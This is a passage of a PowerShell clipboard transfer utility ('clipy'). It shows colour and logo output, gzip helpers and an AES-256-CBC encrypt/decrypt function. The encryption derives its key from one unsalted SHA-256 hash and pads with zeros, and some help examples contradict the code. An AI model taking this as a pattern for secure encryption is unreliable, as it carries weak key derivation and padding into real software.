        "Blue" = $ANSI_esc+"[1;34m"
        "Magenta" = $ANSI_esc+"[1;35m"
        "Cyan" = $ANSI_esc+"[1;36m"
        "LightGrey" = $ANSI_esc+"[1;37m"
        "DarkGrey" = $ANSI_esc+"[1;90m"
        "Reset" = $ANSI_esc+"[0m"
        }

        # Build logo
        if ($Logo -eq $True) {
            $legend_logo_start = $ANSI_Table["Blue"]
            $legend_logo_stop = $ANSI_Table["Reset"]
            $Value = @"
$legend_logo_start
          _ _             
         | (_)            
      ___| |_ _ __  _   _ 
     / __| | | '_ \| | | |
    | (__| | | |_) | |_| |
     \___|_|_| .__/ \__, |
             | |     __/ |
             |_|    |___/ 
                       Version $Value
$legend_logo_stop
    Clipboard Transfer Utility
    by @61106960

"@
        }
    }

    PROCESS {
        $OutputValue = $ANSI_Table[$Color]+$Value+$ANSI_Table["Reset"]
        Return $OutputValue
    }
}

function Get-CompressedByteArray {
    <#
    .DESCRIPTION
    Helper function. Compress a provided ByteArray and return as ByteArray.
    
    .PARAMETER byteArray
    Input value that will be compressed. Must be in the format ByteArray.
    #>
	[CmdletBinding()]
    Param (
	    [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray = $(Throw("-byteArray is required"))
    )

	Process {
        Write-Verbose "[Get-CompressedByteArray] Compressing incoming data..."
       	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
      	$gzipStream.Write( $byteArray, 0, $byteArray.Length )
        $gzipStream.Close()
        $output.Close()
        $outputData = $output.ToArray()
        Write-Verbose "[Get-CompressedByteArray] Compressing done"
        Return $outputData
    }
}

function Get-DecompressedByteArray {
    <#
    .DESCRIPTION
    Helper function. Decompress a provided ByteArray and return as ByteArray.
    
    .PARAMETER byteArray
    Input value that will be decompressed. Must be in the format ByteArray.
    #>
	[CmdletBinding()]
    Param (
		[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray = $(Throw("-byteArray is required"))
    )
	
    Process {
	    Write-Verbose "[Get-DecompressedByteArray] Decompressing incoming data..."
        $inputStream = New-Object System.IO.MemoryStream( , $byteArray )
	    $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $inputStream, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo( $output )
        $gzipStream.Close()
		$inputStream.Close()
		[byte[]] $byteOutArray = $output.ToArray()
        Write-Verbose "[Get-DecompressedByteArray] Decompressing done"
        Return $byteOutArray
    }
}

function Invoke-AESEncryption {
    <#
    .DESCRIPTION
    Helper function. Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)
    
    .PARAMETER Mode
    Encryption or Decryption Mode
    
    .PARAMETER Key
    Key used to encrypt or decrypt
    
    .PARAMETER Text
    String value to encrypt or decrypt
    
    .PARAMETER Path
    Filepath for file to encrypt or decrypt
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
    
    Description
    -----------
    Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
    
    Description
    -----------
    Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
    
    Description
    -----------
    Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
    
    .EXAMPLE
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
    
    Description
    -----------
    Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
    #>
    [CmdletBinding()]
    [OutputType([string])]
    Param (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String] $Mode,

        [Parameter(Mandatory = $true)]
        [String] $Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String] $Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String] $Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}